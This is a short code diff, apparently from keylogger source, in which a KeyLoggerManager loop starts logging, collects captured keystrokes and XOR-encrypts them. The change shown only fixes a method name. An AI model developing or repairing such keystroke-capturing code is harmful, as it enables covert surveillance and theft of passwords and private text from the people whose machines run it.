@@ -18,7 +18,7 @@ class KeyLoggerManager:
           self.start.start_logging()
 
           while True:
-               self.start.stoplogging()
+               self.start.stop_logging()
                time.sleep(self.TIME)
                text =''.join(self.start.get_logged_keys())
                xor=self.xor.xor_encrypt_decrypt(text,key)
